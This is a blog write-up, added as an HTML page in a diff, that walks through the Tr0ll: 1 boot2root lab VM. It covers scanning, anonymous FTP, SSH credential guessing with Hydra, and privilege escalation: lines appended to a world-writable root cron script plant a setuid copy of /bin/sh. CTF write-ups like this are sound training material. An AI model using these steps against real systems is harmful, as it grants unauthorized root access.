@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Tr0ll: 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-08-29">August 29, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/tr0ll">tr0ll</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Tr0ll: 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Tr0ll is a boot2root, from <a href="https://twitter.com/@maleus21">Maleus</a>.  It was inspired by the constant trolling of the machines within the OSCP labs.  The goal is simple, gain root and get Proof.txt from the /root directory.  Not for the easily frustrated!  Fair warning, there be trolls ahead!</p>
+
+<h2 id="nmap:5cf26261215ffd911b8d76378f87ff79">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -A -p- 192.168.127.103
+ 
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap [NSE: writeable]
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey:
+|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
+|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
+|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/secret
+|_http-title: Site doesn't have a title (text/html).
+</code></pre>
+
+<p>Starting from the top, anonymous FTP login is permitted and Nmap has listed the root directory.  I logged in manually and downloaded <code>lol.pcap</code>.</p>
+
+<pre><code class="language-text">root@kali:~/vuln/tr0ll# strings lol.pcap
+[...snip...]
+W150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
+WWell, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
+Sucks, you were so close... gotta TRY HARDER!
+</code></pre>
+
+<p>Having a look around the Apache service reveals a few friendly images.</p>
+
+<p><div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/troll-1/problem.jpg"  />
+    
+    
+</figure>
+</div>
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/troll-1/umad.jpg"  />
+    
+    
+</figure>
+</div></p>
+
+<p>Other tools such as <code>nikto</code> didn&rsquo;t turn up anything more.  After a little pondering I decided to try <code>sup3rs3cr3tdirlol</code> as a directory in the URL, and was presented with the following page:</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/troll-1/secretdir.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>I downlaoded <code>roflmao</code> which turned out to be a binary file, which doesn&rsquo;t appear to do anything more than print the following message:</p>
+
+<pre><code class="language-text">Find address 0x0856BF to proceed
+</code></pre>
+
+<p>This has the potential to send you on a massive goose chase, but I was now thinking like a proper troll :p.  Address&hellip; Web address&hellip;?</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/troll-1/0856bf.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>Heh, nice.  These directories contain the following files:</p>
+
+<pre><code class="language-text">Index of /0x0856BF/good_luck
+[TXT]     which_one_lol.txt     2014-08-09 23:32      109
+ 
+maleus
+ps-aux
+felux
+Eagle11
+genphlux &lt; -- Definitely not this one
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+</code></pre>
+
+<pre><code class="language-text">Index of /0x0856BF/this_folder_contains_the_password
+[TXT]     Pass.txt     2014-08-09 23:18      12 
+ 
+Good_job_:)
+</code></pre>
+
+<p>I took the list in <code>which_one_lol.txt</code> and used it as potential usernames, and the string <code>Good_job_:)</code> as a password.  I then ran this through <code>Hydra</code> to try my luck against SSH.  Unfortunately, it seems that after about 7-8 incorrect logins, the SSH service closes for a while before coming back up.  <code>Hydra</code> doesn&rsquo;t seem to save its session when this happens, so carrying on after the service comes back up didn&rsquo;t seem possible.  To this end, I just tried the logins manually, since there weren&rsquo;t actually that many.</p>
+
+<p>However, this password was not valid for any of these accounts :(</p>
+
+<p>More trolls however - if we recall the name of the directory, <code>this_folder_contains_the_password</code>.  What&rsquo;s in that folder?  <code>Pass.txt</code>.  Try the filename as a password&hellip;?</p>
+
+<p>I finally got a successful login with <code>overflow:Pass.txt</code>.  Woop.</p>
+
+<h2 id="ssh:5cf26261215ffd911b8d76378f87ff79">SSH</h2>
+
+<p>I started some basic enumeration until this happened:</p>
+
+<pre><code class="language-text">Broadcast Message from root@trol                                              
+        (somewhere) at 9:20 ...                                               
+ 
+TIMES UP LOL!                                                                 
+ 
+Connection to 192.168.127.103 closed by remote host.
+</code></pre>
+
+<p>Oh for God sake, haha - this seems to happen every five minutes or so, but you can just reconnect each time.</p>
+
+<p>I got a hit whilst searching for world-writeable files.</p>
+
+<pre><code class="language-text">find / -perm -0002 -type f -print
+[...snip...]
+/lib/log/cleaner.py
+ 
+-rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
+</code></pre>
+
+<p>A world-writeable script owned by root?  Jackpot (rasta_mouse braces himself for more trolls)&hellip;</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('rm -r /tmp/* ')
+except:
+        sys.exit()
+</code></pre>
+
+<p>I simply added two new lines to this.</p>
+
+<pre><code class="language-python">os.system('cp /bin/sh /tmp/sh')
+os.system('chmod 4777 /tmp/sh')
+</code></pre>
+
+<p>I waited a few minutes and eventually my shell turned up!</p>
+
+<pre><code class="language-text">-rwxrwxrwx 1 root root 112204 Aug 29 10:31 sh
+</code></pre>
+
+<pre><code class="language-text"># id
+uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=0(root),1002(overflow)
+# whoami
+root
+</code></pre>
+
+<h2 id="flag:5cf26261215ffd911b8d76378f87ff79">Flag</h2>
+
+<p>From here, you can cat the flag.</p>
+
+<pre><code class="language-text"># cat root/proof.txt
+Good job, you did it!
+ 
+702a8c18d29c6f3ca0d99ef5712bfbdc
+</code></pre>
+
+<p>I also wanted to take a look at the automated processes going on, so here they are.</p>
+
+<pre><code class="language-text">*/5 * * * * /usr/bin/python /opt/lmao.py
+*/2 * * * * /usr/bin/python /lib/log/cleaner.py
+</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python
+import os
+ 
+os.system('echo &quot;TIMES UP LOL!&quot;|wall')
+os.system(&quot;pkill -u 'overflow'&quot;)
+sys.exit()
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
